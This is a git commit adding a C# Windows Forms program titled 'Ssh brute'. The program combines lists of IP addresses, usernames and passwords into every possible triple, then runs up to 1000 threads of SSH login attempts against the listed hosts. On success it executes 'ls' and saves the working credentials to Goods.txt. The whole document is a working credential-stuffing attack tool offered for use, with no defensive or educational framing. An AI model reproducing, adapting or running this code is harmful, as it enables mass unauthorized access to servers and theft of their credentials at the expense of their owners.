a4489015401fedb8e07a39711815c767329e1033
Jazis <gulko46@gmail.com>
2020-11-13 21:06:27 +0300

    comment

---
+++ ssh_brute/Form1.Designer.cs
@@ -0,0 +1,220 @@
+﻿namespace ssh_brute
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Обязательная переменная конструктора.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Освободить все используемые ресурсы.
+        /// </summary>
+        /// <param name="disposing">истинно, если управляемый ресурс должен быть удален; иначе ложно.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Код, автоматически созданный конструктором форм Windows
+
+        /// <summary>
+        /// Требуемый метод для поддержки конструктора — не изменяйте 
+        /// содержимое этого метода с помощью редактора кода.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.button1 = new System.Windows.Forms.Button();
+            this.button2 = new System.Windows.Forms.Button();
+            this.button3 = new System.Windows.Forms.Button();
+            this.listBox1 = new System.Windows.Forms.ListBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            this.openFileDialog1 = new System.Windows.Forms.OpenFileDialog();
+            this.saveFileDialog1 = new System.Windows.Forms.SaveFileDialog();
+            this.button4 = new System.Windows.Forms.Button();
+            this.button5 = new System.Windows.Forms.Button();
+            this.button6 = new System.Windows.Forms.Button();
+            this.label4 = new System.Windows.Forms.Label();
+            this.label5 = new System.Windows.Forms.Label();
+            this.label6 = new System.Windows.Forms.Label();
+            this.SuspendLayout();
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(12, 12);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(75, 23);
+            this.button1.TabIndex = 0;
+            this.button1.Text = "Logins";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // button2
+            // 
+            this.button2.Location = new System.Drawing.Point(12, 41);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(75, 23);
+            this.button2.TabIndex = 1;
+            this.button2.Text = "Passwds";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // button3
+            // 
+            this.button3.Location = new System.Drawing.Point(12, 70);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(75, 23);
+            this.button3.TabIndex = 2;
+            this.button3.Text = "IPS";
+            this.button3.UseVisualStyleBackColor = true;
+            this.button3.Click += new System.EventHandler(this.button3_Click);
+            // 
+            // listBox1
+            // 
+            this.listBox1.FormattingEnabled = true;
+            this.listBox1.Location = new System.Drawing.Point(12, 172);
+            this.listBox1.Name = "listBox1";
+            this.listBox1.Size = new System.Drawing.Size(400, 134);
+            this.listBox1.TabIndex = 3;
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(94, 21);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(48, 13);
+            this.label1.TabIndex = 4;
+            this.label1.Text = "File Path";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(93, 51);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(48, 13);
+            this.label2.TabIndex = 5;
+            this.label2.Text = "File Path";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Location = new System.Drawing.Point(93, 80);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(48, 13);
+            this.label3.TabIndex = 6;
+            this.label3.Text = "File Path";
+            // 
+            // openFileDialog1
+            // 
+            this.openFileDialog1.FileName = "openFileDialog1";
+            // 
+            // button4
+            // 
+            this.button4.Location = new System.Drawing.Point(12, 99);
+            this.button4.Name = "button4";
+            this.button4.Size = new System.Drawing.Size(110, 23);
+            this.button4.TabIndex = 7;
+            this.button4.Text = "Make Combos";
+            this.button4.UseVisualStyleBackColor = true;
+            this.button4.Click += new System.EventHandler(this.button4_Click);
+            // 
+            // button5
+            // 
+            this.button5.Location = new System.Drawing.Point(12, 143);
+            this.button5.Name = "button5";
+            this.button5.Size = new System.Drawing.Size(116, 23);
+            this.button5.TabIndex = 8;
+            this.button5.Text = "Load combos";
+            this.button5.UseVisualStyleBackColor = true;
+            this.button5.Click += new System.EventHandler(this.button5_Click);
+            // 
+            // button6
+            // 
+            this.button6.Location = new System.Drawing.Point(134, 143);
+            this.button6.Name = "button6";
+            this.button6.Size = new System.Drawing.Size(116, 23);
+            this.button6.TabIndex = 9;
+            this.button6.Text = "Start";
+            this.button6.UseVisualStyleBackColor = true;
+            this.button6.Click += new System.EventHandler(this.button6_Click);
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.Location = new System.Drawing.Point(9, 309);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(50, 13);
+            this.label4.TabIndex = 10;
+            this.label4.Text = "Goods: 0";
+            // 
+            // label5
+            // 
+            this.label5.AutoSize = true;
+            this.label5.Location = new System.Drawing.Point(9, 339);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(43, 13);
+            this.label5.TabIndex = 11;
+            this.label5.Text = "Bads: 0";
+            // 
+            // label6
+            // 
+            this.label6.AutoSize = true;
+            this.label6.Location = new System.Drawing.Point(322, 339);
+            this.label6.Name = "label6";
+            this.label6.Size = new System.Drawing.Size(87, 13);
+            this.label6.TabIndex = 12;
+            this.label6.Text = "Active threads: 0";
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(421, 361);
+            this.Controls.Add(this.label6);
+            this.Controls.Add(this.label5);
+            this.Controls.Add(this.label4);
+            this.Controls.Add(this.button6);
+            this.Controls.Add(this.button5);
+            this.Controls.Add(this.button4);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.listBox1);
+            this.Controls.Add(this.button3);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.button1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
+            this.Name = "Form1";
+            this.Text = "Ssh brute";
+            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Form1_FormClosing);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.Button button3;
+        private System.Windows.Forms.ListBox listBox1;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.OpenFileDialog openFileDialog1;
+        private System.Windows.Forms.SaveFileDialog saveFileDialog1;
+        private System.Windows.Forms.Button button4;
+        private System.Windows.Forms.Button button5;
+        private System.Windows.Forms.Button button6;
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.Label label5;
+        private System.Windows.Forms.Label label6;
+    }
+}
+
---
+++ ssh_brute/Form1.cs
@@ -0,0 +1,196 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Threading;
+using System.IO;
+using Renci.SshNet;
+
+namespace ssh_brute
+{
+    public partial class Form1 : Form
+    {
+        public static string _logins;
+        public static string _passwords;
+        public static string _ips;
+        public static string _combos;
+        public static List<string> threads = new List<string>();
+        public static Thread thread0_start;
+        public static Thread thread1_start;
+        public static Thread thread2_start;
+
+        public static int goods = 0;
+        public static int bads = 0;
+
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            using (OpenFileDialog openFileDialog = new OpenFileDialog())
+            {
+                openFileDialog.Title = "Logins load";
+                openFileDialog.Filter = "TextFile(*.txt)|*.txt";
+                openFileDialog.ShowDialog();
+                label1.Text = openFileDialog.FileName;
+                _logins = openFileDialog.FileName;
+            }
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            using (OpenFileDialog openFileDialog = new OpenFileDialog())
+            {
+                openFileDialog.Title = "Passwords load";
+                openFileDialog.Filter = "TextFile(*.txt)|*.txt";
+                openFileDialog.ShowDialog();
+                label2.Text = openFileDialog.FileName;
+                _passwords = openFileDialog.FileName;
+            }
+        }
+
+        private void button3_Click(object sender, EventArgs e)
+        {
+            using (OpenFileDialog openFileDialog = new OpenFileDialog())
+            {
+                openFileDialog.Title = "IPS load";
+                openFileDialog.Filter = "TextFile(*.txt)|*.txt";
+                openFileDialog.ShowDialog();
+                label3.Text = openFileDialog.FileName;
+                _ips = openFileDialog.FileName;
+            }
+        }
+
+        public void combos_make()
+        {
+            listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add("Working")));
+            int counter = 0;
+            var logins_lines = File.ReadAllLines(_logins);
+            var passwds_lines = File.ReadAllLines(_passwords);
+            var ips_lines = File.ReadAllLines(_ips);
+            for (int i = 0; i < ips_lines.Length; i++)
+            {
+                for (int j = 0; j< logins_lines.Length; j++)
+                {
+                    for (int k = 0; k < passwds_lines.Length; k++)
+                    {
+                        string combo = ips_lines[i] + "|" + logins_lines[j] + ":" + passwds_lines[k];
+                        using (StreamWriter sw = File.AppendText("out.txt"))
+                        {
+                            sw.WriteLine(combo);
+                            counter++;
+                            if (counter % 10000 == 0)
+                            {
+                                listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
+                            }
+                        }
+                    }
+                }
+            }
+            MessageBox.Show($"Ready -> {counter}");
+        }
+
+        private void button4_Click(object sender, EventArgs e)
+        {
+            thread0_start = new Thread(combos_make);
+            thread0_start.Start();
+        }
+
+        private void button5_Click(object sender, EventArgs e)
+        {
+            using (OpenFileDialog openFileDialog = new OpenFileDialog())
+            {
+                openFileDialog.Title = "Combos load";
+                openFileDialog.Filter = "TextFile(*.txt)|*.txt";
+                openFileDialog.ShowDialog();
+                listBox1.Items.Clear();
+                _combos = openFileDialog.FileName;
+                listBox1.Items.Add($"Combos path ->{openFileDialog.FileName}");
+            }
+        }
+
+        public void authorize(string combos_line, string thread_name)
+        {
+            string ip = combos_line.Split('|')[0].Split(':')[0];
+            int port = int.Parse(combos_line.Split('|')[0].Split(':')[1]);
+            string username = combos_line.Split('|')[1].Split(':')[0];
+            string password = combos_line.Split('|')[1].Split(':')[1];
+            PasswordConnectionInfo connectionInfo = new PasswordConnectionInfo(ip, port, username, password);
+            listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Trying -> {ip} | {port} | {username} | {password}")));
+            connectionInfo.Timeout = TimeSpan.FromSeconds(30);
+            using (var client = new SshClient(connectionInfo))
+            {
+                try
+                {
+                    client.Connect();
+                    if (client.IsConnected)
+                    {
+                        client.RunCommand("ls");
+                        listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Good one -> {combos_line}")));
+                        goods++;
+                        label4.Invoke((MethodInvoker)(() => label4.Text = $"Goods: {goods}"));
+                        using (StreamWriter sw = new StreamWriter("Goods.txt"))
+                        {
+                            sw.WriteLine(combos_line);
+                        }
+                    }
+                    else 
+                    {
+                        bads++;
+                        label5.Invoke((MethodInvoker)(() => label5.Text = $"Bads: {bads}"));
+                    }
+                }
+                catch { }
+            }
+            threads.Remove(thread_name);
+        }
+
+
+        public void bruteforcing()
+        {
+            var combos_lines = File.ReadAllLines(_combos);
+            for (int i = 0; i<File.ReadAllLines(_combos).Length; i++)
+            {
+                while (true)
+                {
+                    label6.Invoke((MethodInvoker)(() => label6.Text = $"Active threads: {threads.Count}"));
+                    if (threads.Count >= 1000) { Thread.Sleep(10); }
+                    else
+                    {
+                        string thread_name = $"Thread-{i}";
+                        threads.Add(thread_name);
+                        thread2_start = new Thread(() => authorize(File.ReadAllLines(_combos)[i], thread_name));
+                        thread2_start.Start();
+                        Thread.Sleep(50);
+                        break;
+                    }
+                }
+            }
+        }
+
+        private void button6_Click(object sender, EventArgs e)
+        {
+            goods = 0;
+            bads = 0;
+            thread1_start = new Thread(bruteforcing);
+            thread1_start.Start();
+        }
+
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            
+            try { Thread.CurrentThread.Abort(); } catch { Application.Exit(); }
+            try { threads.Clear(); } catch { }
+            try { thread0_start.Abort(); } catch { }
+            try { thread1_start.Abort(); } catch { }
+            try { thread2_start.Abort(); } catch { }
+        }
+    }
+}
